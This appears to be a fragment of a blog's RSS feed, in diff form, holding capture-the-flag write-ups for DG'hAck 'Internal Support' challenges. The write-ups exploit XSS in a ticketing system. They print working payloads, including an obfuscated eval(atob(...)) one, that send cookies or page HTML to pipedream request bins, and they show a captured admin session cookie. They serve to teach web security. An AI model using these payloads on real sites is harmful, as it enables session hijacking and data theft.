+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">XMLHttpRequest&lt;/span>();
+&lt;span style="color:#a6e22e">request&lt;/span>.&lt;span style="color:#a6e22e">onreadystatechange&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> () {
+&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">DONE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">DONE&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">readyState&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">DONE&lt;/span>){
+&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">encoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">btoa&lt;/span>(&lt;span style="color:#a6e22e">request&lt;/span>.&lt;span style="color:#a6e22e">responseText&lt;/span>);
+document.&lt;span style="color:#a6e22e">location&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;https://enx8b5ofkwzw.x.pipedream.net?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">encoded&lt;/span>;
+}
+};
+&lt;span style="color:#a6e22e">request&lt;/span>.&lt;span style="color:#a6e22e">open&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;GET&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>, &lt;span style="color:#66d9ef">true&lt;/span>);
+&lt;span style="color:#a6e22e">request&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#66d9ef">null&lt;/span>);
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>NOTE : we can&amp;rsquo;t use the &lt;code>fetch&lt;/code> api, the bot must not be that up to date.&lt;/p>
+&lt;p>Which translates to this payload:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&amp;lt;&lt;span style="color:#f92672">svg&lt;/span> &lt;span style="color:#a6e22e">onload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;eval(atob(&amp;#39;dmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKcmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7CiAgICB2YXIgRE9ORSA9IHRoaXMuRE9ORSB8fCA0OwogICAgaWYgKHRoaXMucmVhZHlTdGF0ZSA9PT0gRE9ORSl7CiAgICAgICAgdmFyIGVuY29kZWQgPSBidG9hKHJlcXVlc3QucmVzcG9uc2VUZXh0KTsKICAgICAgICBkb2N1bWVudC5sb2NhdGlvbiA9ICdodHRwczovL2VueDhiNW9ma3d6dy54LnBpcGVkcmVhbS5uZXQ/JyArIGVuY29kZWQ7CiAgICB9Cn07CnJlcXVlc3Qub3BlbignR0VUJywgJy8nLCB0cnVlKTsKcmVxdWVzdC5zZW5kKG51bGwpOw==&amp;#39;))&amp;#34;&lt;/span> /&amp;gt;
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>And there we go, after a few seconds, we get our html. In it, we find the todo-list :&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&amp;lt;&lt;span style="color:#f92672">section&lt;/span> &lt;span style="color:#a6e22e">style&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;margin-top: 50px;&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;pt-95 pb-100&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;container&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;row justify-content-center&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;col-lg-8&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;section-title pb-20&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">h4&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;title&amp;#34;&lt;/span>&amp;gt;TODOLIST&amp;lt;/&lt;span style="color:#f92672">h4&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;row justify-content-center&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;col-lg-8&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;section-title pb-20&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">p&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;text&amp;#34;&lt;/span>&amp;gt;
+- Fix the kernel panic problem on the servers
+&amp;lt;/&lt;span style="color:#f92672">p&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">p&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;text&amp;#34;&lt;/span>&amp;gt;
+- Find a solution for the XSS on the helpdesk system
+&amp;lt;/&lt;span style="color:#f92672">p&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">p&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;text&amp;#34;&lt;/span>&amp;gt;
+- Hide the flag &amp;amp;#34;BEtter_BUT_ST!LL_N0tttttttttt++Prfct!&amp;amp;#34; a little bit better
+&amp;lt;/&lt;span style="color:#f92672">p&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">section&lt;/span>&amp;gt;
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Which contains the flag: &lt;code>BEtter_BUT_ST!LL_N0tttttttttt++Prfct!&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Internal Support 1</title><link>https://nicolasb.fr/blog/writeup-dghack-internal-support-1/</link><pubDate>Thu, 19 Nov 2020 03:19:55 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-internal-support-1/</guid><description>The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :
 Trying a classic xss (&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;) in the message field seems to work. We know that we have to login as an admin user, so let&amp;rsquo;s try stealing the cookies :
-&amp;lt;svg onload=&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://eni7j9jobszxl.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34; /&amp;gt; After a few seconds, we get a request on our request bin, which when decoded gives us the admin cookie :</description></item></channel></rss>
+&amp;lt;svg onload=&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://eni7j9jobszxl.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34; /&amp;gt; After a few seconds, we get a request on our request bin, which when decoded gives us the admin cookie :</description><content>&lt;p>The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/internal-support-1.png">&lt;img src="https://nicolasb.fr/assets/dghack/internal-support-1.png" alt="The ticketing system">&lt;/a>&lt;/p>
+&lt;p>Trying a classic xss (&lt;code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>) in the message field seems to work. We know that we have to login as an admin user, so let&amp;rsquo;s try stealing the cookies :&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&amp;lt;&lt;span style="color:#f92672">svg&lt;/span> &lt;span style="color:#a6e22e">onload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://eni7j9jobszxl.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34;&lt;/span> /&amp;gt;
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>After a few seconds, we get a request on our &lt;a href="https://requestbin.com/">request bin&lt;/a>, which when decoded gives us the admin cookie :&lt;/p>
+&lt;pre>&lt;code>session=.eJwlTstqwzAQ_BWhcyh67UryV_RegllJu7GpGxfLOYX8exV6GubBzDz1LBv1hbuevp5anQP0D_dON9YX_bkxdVbbflPrXZ27olqHqc5l7ep3ZD709XW9jJKD-6Kn83jwYGvTk84VfCkhQ7NoI7GLVhJF8hhNDcEEtFnQCOWYoIENURoKtoQ1coiGjA8sAi65VFMBahElo1gStozZZxYKxgGERpliDNYTChQoBkuDcX9-dD7-39hBaz9kPvdvvg-hgpTkjBPyb_RUGZhqhOxbDqW9h5EI9OsP9hJWpw.X7XZVw.vQUecnJN2gaDUDDYuPeB5LNZbbg
+&lt;/code>&lt;/pre>&lt;p>Logging in using that cookie reveals this todo-list :&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/internal-support-1-todo.png">&lt;img src="https://nicolasb.fr/assets/dghack/internal-support-1-todo.png" alt="The admin&amp;rsquo;s todo list">&lt;/a>&lt;/p>
+&lt;p>Which contains the flag: &lt;code>NoUserValidationIsADangerousPractice&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item></channel></rss>
